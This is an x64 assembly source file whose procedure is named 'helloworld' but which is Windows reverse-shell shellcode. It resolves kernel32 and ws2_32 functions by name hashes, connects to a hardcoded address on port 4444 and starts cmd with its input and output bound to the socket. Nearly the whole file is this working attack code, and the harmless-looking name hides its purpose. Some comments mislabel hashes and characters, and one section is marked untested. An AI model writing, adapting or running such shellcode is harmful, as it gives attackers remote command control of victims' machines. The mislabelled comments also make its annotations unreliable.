.code

helloworld PROC
	start:
		sub rsp, 1000h
		mov r15, rsp					; copy stack pointer to r15 register

	; Parse PEB and find kernel32
	find_kernel32:   
		xor rcx, rcx					; RCX = 0
		mov rsi, gs:[rcx + 60h]			; RAX = PEB
		mov rsi, [rsi + 18h]			; RAX = PEB->Ldr
		mov rsi, [rsi + 30h]			; RSI = PEB->Ldr.InMemOrder
		mov dl, 4bh

    next_module:
		mov rbx, [rsi + 10h]			; EBX = InInitOrder[X].base_address
		mov rdi, [rsi + 40h]			; EDI = InInitOrder[X].module_name
		mov rsi, [rsi]					; ESI = InInitOrder[X].flink (next)
		cmp [rdi + 12*2], cx			; (unicode) modulename[12] == 0x00 ?
		jne next_module					; No: try next module
		cmp [rdi], dl					; modulename starts with "K"
		jne next_module					; No: try next module

	find_function_shorten:
		jmp find_function_shorten_bnc   ; Short jump

	find_function_ret:
		pop rsi                         ; POP the return address from the stack
		mov [r15 + 80h], rsi			; Save find_function address for later usage
		jmp resolve_symbols_kernel32    ; resolve functions inside kernel32 dll

	find_function_shorten_bnc:
		call find_function_ret          ; Relative CALL with negative offset

    find_function:
		push rax
		xor rax, rax
        mov eax, [rbx + 3ch]			; Offset to PE Signature
		add rax, 88h
		xor rdi, rdi
        mov edi, [rbx + rax]			; Export Table Directory RVA
        add rdi, rbx					; Export Table Directory VMA
        mov ecx, [rdi + 18h]			; NumberOfNames
        mov eax, [rdi + 20h]			; AddressOfNames RVA
        add rax, rbx					; AddressOfNames VMA
        mov [r15 + 88h], rax				; Save AddressOfNames VMA for later

	find_function_loop:
		jecxz find_function_finished    ; Jump to the end if ECX is 0
		dec rcx							; Decrement our names counter
		mov rax, [r15 + 88h]				; Restore AddressOfNames VMA
		xor rsi, rsi
		mov esi, [rax + rcx * 4]		; Get the RVA of the symbol name
		add rsi, rbx					; Set ESI to the VMA of the current symbol name

	compute_hash:
		xor rax , rax					; NULL EAX
		xor r9, r9						; NULL EDX
		cld                             ; Clear direction

	compute_hash_again:
		lodsb                           ; Load the next byte from esi into al
		test al, al						; Check for NULL terminator
		jz compute_hash_finished		; If the ZF is set, we've hit the NULL term
		ror r9d, 0dh					; Rotate edx 13 bits to the right
		add r9, rax						; Add the new byte to the accumulator
		jmp compute_hash_again			; Next iteration

	compute_hash_finished:

	find_function_compare:
		cmp r9, [rsp + 10h]				; Compare the computed hash with the requested hash
		jnz find_function_loop			; If it doesn't match go back to find_function_loop
		xor rdx, rdx
		mov edx, [rdi + 24h]			; AddressOfNameOrdinals RVA
		add rdx, rbx					; AddressOfNameOrdinals VMA
		mov cx,  [rdx + 2 * rcx]		; Extrapolate the function's ordinal
		mov edx, [rdi + 1ch]			; AddressOfFunctions RVA
		add rdx, rbx					; AddressOfFunctions 
		xor eax, eax
		mov eax, [rdx + 4 * rcx]		; Get the function RVA
		add rax, rbx					; Get the function VMA
		mov [rsp], rax					; Save

	find_function_finished:
		pop rax
		ret

	resolve_symbols_kernel32:
		xor r14, r14
		mov r14d, 78b5b983h				; TerminateProcess hash
		push r14		          
		call qword ptr [r15 + 80h]		; Call find_function
		mov [r15 + 90h], rax			; Save TerminateProcess address for later usage
		xor r14, r14
		mov r14d, 0ec0e4e8eh			; LoadLibraryA hash
		push r14
		call qword ptr [r15 + 80h]		; Call find_function
		mov  [r15 + 98h], rax			; Save LoadLibraryA address for later usage
		xor r14, r14
		mov r14d, 16b3fe72h				; LoadLibraryA hash
		push  r14
		call qword ptr [r15 + 80h]		; Call find_function
		mov  [r15 + 100h], rax			; Save CreateProcessA address for later usage

	
	load_ws2_32:
		mov   rcx, 642e32335f327377h	; Push another part of the string on the stack
		mov  [r15 + 108h], rcx			; put string in stack
		mov rcx, 6c6ch					;
		mov  [r15 + 110h], rcx			; put null in stack
		lea rcx, [r15 + 108h]			; save address of the string in rcx
		mov rax, [r15 + 98h]			;
		call rax						; Call LoadLibraryA

	resolve_symbols_ws2_32:
		mov rbx, rax					; Move the base address of ws2_32.dll to RBX
		xor r14, r14
		mov r14d, 3bfcedcbh				; WSAStartup hash
		push r14
		call qword ptr [r15 + 80h]		; Call find_function
		mov  [r15 + 118h], rax			; Save WSAStartup address for later usage
		xor r14, r14
		mov r14d, 0adf509d9h			; WSASocketA hash
		push r14
		call qword ptr [r15 + 80h]		; Call find_function
		mov  [r15 + 120h], rax			; Save WSASocketA address for later usage
		xor r14, r14
		mov r14d, 0b32dba0ch			; WSAConnect hash
		push r14
		call qword ptr [r15 + 80h]		; Call find_function
		mov  [r15 + 128h], rax			; Save WSAConnect address for later usage

	; not tested
	call_wsastartup:
		pop rbx
		mov rcx, 202h					; wVersionRequired
		lea rdx, [r15 + 300h]			; lpWSAData structure
		mov rax, [r15 + 118h]			; WSAStartup Saved Address 
		call rax

	call_wsasocketa:
		mov ecx, 2						; af
		mov rdx, 1						; type
		mov r8, 6						; IPPROTO_TCP
		xor r9, r9						; lpProtocolInfo
		mov [rsp+20h], r9				; g
		mov [rsp+28h], r9				; dwFlags
		mov rax, [r15 + 120h]			; WSASocketA Saved Address 
		call rax
		mov rsi, rax					; save socket handle in rsi

	call_connect:
		mov rcx, rax					; pointer to the socket
		mov r8, 10h						; namelen argument = 10
		lea rdx, [r15 + 300h]			; pointer to sockaddr_in
		mov r9, 0a64a8c05c11h			; sin_addr + sin_port (4444)
		mov [rdx + 2], r9				; write above to stack
		xor r9,r9						;
		inc r9d							;
		inc r9d							;  0x02 (AF_INET)
		shl r9d, 10h					; shift left so it can be 00000200
		mov [rdx - 2], r9d
		xor r9, r9
		mov [rdx + 8], r9				; add array of 0
		mov rax, [r15 + 128h]           ; WSAConnect
		call rax

	setup_si_and_pi:
		mov rdi, r15					; RSP -> R15 -> RDI
		add rdi, 500h					; r15 + 500
		mov rbx, rdi
		xor eax, eax
		mov ecx, 20h
		rep stosd
		mov eax, 68h
		mov [rbx], eax
		mov eax, 100h
		mov [rbx + 3ch], eax			; lpStartupInfo.dwFlags
		mov [rbx + 50h], rsi			; lpStartupInfo.hStdInput = socket handle
		mov [rbx + 58h], rsi			; lpStartupInfo.hStdOutput = socket handle
		mov [rbx + 60h], rsi			; lpStartupInfo.hStdError = socket handle

	call_createprocessa:
		xor rcx, rcx					; lpApplicationName
		mov rdx, r15					; lpCommandLine
		add rdx, 600h					; add rdx, 600h
		xor eax, eax					; "cmd" => 646d63h
		mov al, 64h						; Load 'c' (ASCII 0x63) into AL (lowest byte of EAX)
		shl eax, 8						; Shift EAX left by 8 bits (move 'c' to the next byte
		add al, 6dh						; Add 'm' (ASCII 0x6D) to AL, now EAX = 0x006D63
		shl eax, 8						; Shift EAX left by 8 bits (move 'm' and 'c')
		add al, 63h						; Add 'd' (ASCII 0x64) to AL, now EAX = 0x646D63
		mov [rdx], rax
		xor r8, r8						; lpProcessAttributes
		xor r9, r9						; lpThreadAttributes
		xor eax, eax
		inc eax
		mov [rsp + 20h], rax			; bInherittHandles
		dec eax
		mov [rsp + 28h], rax			; dwCreationFlags
		mov [rsp + 30h], rax			; lpEnvironement
		mov [rsp + 38h], rax			; lpCurrentDirectory
		mov [rsp + 40h], rbx			; lpStartupInfo
		add rbx, 68h
		mov [rsp + 48h], rbx			; lpProcessInformation
		mov rax, [r15 + 100h]
		call rax

	call_terminateprocess:
		xor rcx, rcx
		dec rcx
		xor rdx, rdx
		mov rax, [r15 + 90h]
		call rax

helloworld ENDP

END
